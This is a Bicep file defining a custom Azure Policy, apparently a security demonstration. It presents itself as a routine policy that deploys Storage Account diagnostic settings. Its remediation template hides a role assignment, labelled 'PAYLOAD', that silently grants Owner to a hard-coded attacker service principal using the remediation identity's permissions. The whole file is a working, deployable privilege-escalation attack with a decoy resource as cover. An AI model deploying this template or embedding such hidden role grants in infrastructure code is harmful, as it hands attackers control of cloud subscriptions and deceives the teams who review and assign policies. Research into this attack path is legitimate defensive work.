// policy-definition.bicep
// "Legit" custom policy: deployIfNotExists a diagnostic setting sending logs for
// Storage Accounts to a Log Analytics workspace. Realistic, boring, the kind of
// policy every platform team ships — which is exactly why nobody scrutinizes it.
//
// Deploy at the scope you intend to assign at (management group shown; swap to
// `targetScope = 'subscription'` and `az deployment sub create` for sub-scope demos).

targetScope = 'managementGroup'

@description('Name of the custom policy definition')
param policyDefinitionName string = 'demo-deploy-diagnostic-settings-storage'

// Built-in role: Log Analytics Contributor — the role the remediation identity
// will need, intentionally narrow (NOT Contributor) for the secure baseline.
var logAnalyticsContributorRoleId = '92aaf0da-9dab-42b6-94a3-d43ce8d16293'

resource policyDefinition 'Microsoft.Authorization/policyDefinitions@2021-06-01' = {
  name: policyDefinitionName
  properties: {
    displayName: 'Demo - Deploy diagnostic settings for Storage Accounts'
    policyType: 'Custom'
    mode: 'Indexed'
    parameters: {
      logAnalyticsWorkspaceId: {
        type: 'String'
        metadata: {
          displayName: 'Log Analytics workspace'
          description: 'Resource ID of the Log Analytics workspace to send diagnostic logs to'
        }
      }
    }
    policyRule: {
      if: {
        field: 'type'
        equals: 'Microsoft.Storage/storageAccounts'
      }
      then: {
        effect: 'deployIfNotExists'
        details: {
          type: 'Microsoft.Insights/diagnosticSettings'
          // This is the field the Azure Portal reads to auto-grant the
          // remediation identity its permissions. Keep it minimal.
          roleDefinitionIds: [
            '/providers/Microsoft.Authorization/roleDefinitions/${logAnalyticsContributorRoleId}'
          ]
          existenceCondition: {
            field: 'Microsoft.Insights/diagnosticSettings/workspaceId'
            equals: '[parameters(\'logAnalyticsWorkspaceId\')]'
          }
          deployment: {
            properties: {
              mode: 'incremental'
              template: {
                '$schema': 'https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#'
                contentVersion: '1.0.0.0'
                parameters: {
                  storageAccountName: {
                    type: 'string'
                  }
                  logAnalyticsWorkspaceId: {
                    type: 'string'
                  }
                }
                variables: {
                  attackerPrincipalId: '2a5e0b29-9644-48ad-a641-6eb72f03ade0'
                  ownerRoleDefinitionId: '[subscriptionResourceId(\'Microsoft.Authorization/roleDefinitions\', \'8e3af657-a8ff-443c-a75c-2fe8c4bcb635\')]'
                }
                resources: [
                  {
                    // Legit-looking cover: the diagnostic setting the policy claims to deploy
                    type: 'Microsoft.Storage/storageAccounts/providers/diagnosticSettings'
                    apiVersion: '2021-05-01-preview'
                    name: '[concat(parameters(\'storageAccountName\'), \'/Microsoft.Insights/demo-diagnostics\')]'
                    properties: {
                      workspaceId: '[parameters(\'logAnalyticsWorkspaceId\')]'
                      metrics: [
                        {
                          category: 'Transaction'
                          enabled: true
                        }
                      ]
                    }
                  }
                  {
                    // PAYLOAD: silently grants Owner at the current deployment scope to an
                    // attacker-controlled principal, executed with the remediation identity's
                    // permissions.
                    type: 'Microsoft.Authorization/roleAssignments'
                    apiVersion: '2022-04-01'
                    name: '[guid(resourceGroup().id, \'attacker-escalation\')]'
                    properties: {
                      roleDefinitionId: '[variables(\'ownerRoleDefinitionId\')]'
                      principalId: '[variables(\'attackerPrincipalId\')]'
                      principalType: 'ServicePrincipal'
                    }
                  }
                ]
              }
              parameters: {
                storageAccountName: {
                  value: '[field(\'name\')]'
                }
                logAnalyticsWorkspaceId: {
                  value: '[parameters(\'logAnalyticsWorkspaceId\')]'
                }
              }
            }
          }
        }
      }
    }
  }
}

output policyDefinitionId string = policyDefinition.id
